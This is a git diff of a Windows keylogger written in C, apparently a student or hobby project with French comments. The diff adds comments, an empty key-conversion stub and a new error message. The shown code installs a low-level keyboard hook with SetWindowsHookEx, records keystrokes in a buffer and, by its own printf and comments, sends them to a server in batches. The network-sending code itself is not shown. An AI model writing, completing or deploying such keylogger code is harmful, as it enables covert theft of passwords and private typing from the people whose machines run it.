@@ -9,6 +9,17 @@
 char key_log[MAX_KEYS];
 int current_key_log_size = 0;
 
+
+void key_code_to_string(){
+    
+    /*
+    A CODER:
+
+    Fonction qui permet d'avoir une touche exacte avec son code décimal, attention c'est pas de l'ascii je crois
+    raison pour laquelle les minuscues sont enregistrés en majuscules 
+    */
+}
+
 void send_keys(void){
 
     /*Permet d'envoyer les frappes de claviers au serveur et de vider le tableau  key_log*/
@@ -33,6 +44,10 @@ void log_key(int key) {
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+
+    /*Fonction de callback qui est associé à SetWindowsHookEx plus bas et qui envoie l'entier "key_code" 
+    dans log_key()*/
+
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
         
@@ -48,19 +63,27 @@ int start_keylogger() {
     /*Fonction qui permet je lançer le keylogger grâce aux fonctions de windows.h*/
 
     printf("[*] Lancement du keylogger, envoie des frappes au serveur toute les %d frappes\n", MAX_KEYS);
+
+    /* initialisation du hook permety d'eregistrer l'evennement système WH_KEYBOARD_LL (les frappes au clavier)
+       et la fonction de callback est KeyboardProc
+    */
     HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 
+
+    // Si l'initialisation marche pas
     if (keyboardHook == NULL) {
-        printf("Failed to install hook!\n");
+        printf("[-] Erreur su l'initatisation du keylogger\n");
         return 1;
     }
 
+
+    // un message est un êvennement 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
-    UnhookWindowsHookEx(keyboardHook);
+    UnhookWindowsHookEx(keyboardHook); //supprime le hook
     return 0;
 }
